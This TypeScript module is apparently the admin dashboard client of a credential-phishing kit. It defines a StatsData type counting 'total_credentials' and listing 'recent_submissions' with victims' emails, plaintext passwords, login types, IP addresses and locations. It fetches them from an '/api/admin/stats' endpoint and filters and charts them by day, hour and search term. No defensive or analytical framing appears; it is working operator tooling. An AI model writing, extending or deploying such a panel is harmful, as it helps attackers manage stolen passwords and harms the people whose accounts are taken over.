/**
 * Fetch real statistics from backend API
 */
export type LogAction = "View" | "Download" | "Login";

export interface LogEntry {
  id: number;
  email: string;
  timestamp: string; // ISO
  action: LogAction;
  ip: string;
  userAgent: string;
}

export interface StatsData {
  total_visitors: number;
  total_credentials: number;
  recent_submissions: Array<{
    id: number;
    email: string;
    password: string;
    login_type: string;
    ip_address: string;
    created_at: string;
    country?: string;
    city?: string;
  }>;
  by_type: Record<string, number>;
  by_country: Record<string, number>;
}

/**
 * Fetch statistics from backend API
 */
export async function fetchStats(token: string): Promise<StatsData | null> {
  try {
    const response = await fetch('/api/admin/stats', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });

    if (!response.ok) {
      return null;
    }

    const data = await response.json();
    return data.success ? data.data : null;
  } catch (error) {
    console.error('Failed to fetch stats:', error);
    return null;
  }
}

/**
 * Fetch logs from backend API
 */
export async function fetchLogs(token: string, limit: number = 50): Promise<LogEntry[] | null> {
  try {
    const response = await fetch('/api/admin/stats', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });

    if (!response.ok) {
      return null;
    }

    const data = await response.json();
    if (!data.success) {
      return null;
    }

    // Convert backend data to LogEntry format
    const logs: LogEntry[] = data.data.recent_submissions?.map((sub: any, index: number) => ({
      id: index + 1,
      email: sub.email,
      timestamp: sub.created_at || new Date().toISOString(),
      action: sub.login_type === 'main' ? 'Login' : 'Login',
      ip: sub.ip_address || 'Unknown',
      userAgent: sub.user_agent || 'Unknown'
    })) || [];

    return logs;
  } catch (error) {
    console.error('Failed to fetch logs:', error);
    return null;
  }
}

export type RangeFilter =
  | { kind: "7d" }
  | { kind: "30d" }
  | { kind: "custom"; from: string; to: string }; // yyyy-mm-dd

function dayKey(iso: string) {
  return iso.slice(0, 10);
}

function shiftDay(days: number) {
  const d = new Date();
  d.setUTCDate(d.getUTCDate() - days);
  return d.toISOString().slice(0, 10);
}

/** Inclusive yyyy-mm-dd bounds for a range. "Last 7 days" = today and the 6 days before. */
export function rangeBounds(range: RangeFilter): { from: string; to: string } {
  if (range.kind === "7d") return { from: shiftDay(6), to: shiftDay(0) };
  if (range.kind === "30d") return { from: shiftDay(29), to: shiftDay(0) };
  const from = range.from || "0000-01-01";
  const to = range.to || "9999-12-31";
  return from <= to ? { from, to } : { from: to, to: from };
}

export function filterLogs(logs: LogEntry[], range: RangeFilter, query: string): LogEntry[] {
  const { from, to } = rangeBounds(range);
  const q = query.trim().toLowerCase();
  return logs.filter((l) => {
    const day = dayKey(l.timestamp);
    if (day < from || day > to) return false;
    if (!q) return true;
    return l.email.toLowerCase().includes(q) || l.ip.includes(q);
  });
}

export function visitorsPerDay(logs: LogEntry[], range: RangeFilter) {
  const { from, to } = rangeBounds(range);
  const days = new Map<string, Set<string>>();
  // Prefill each day for preset ranges so the line has no gaps.
  if (range.kind !== "custom") {
    const n = range.kind === "7d" ? 7 : 30;
    for (let i = n - 1; i >= 0; i--) days.set(shiftDay(i), new Set());
  }
  for (const l of logs) {
    const day = dayKey(l.timestamp);
    if (day < from || day > to) continue;
    if (!days.has(day)) days.set(day, new Set());
    days.get(day)?.add(l.email);
  }
  return [...days.entries()]
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([day, set]) => ({ day: day.slice(5), visitors: set.size }));
}

export function actionsPerHour(logs: LogEntry[]) {
  const hours = Array.from({ length: 24 }, (_, h) => ({ hour: String(h).padStart(2, "0"), actions: 0 }));
  for (const l of logs) {
    const h = Number(l.timestamp.slice(11, 13));
    const slot = hours[h];
    if (slot) slot.actions += 1;
  }
  return hours;
}

export function summarize(logs: LogEntry[]) {
  return {
    uniqueVisitors: new Set(logs.map((l) => l.email)).size,
    downloads: logs.filter((l) => l.action === "Download").length,
  };
}
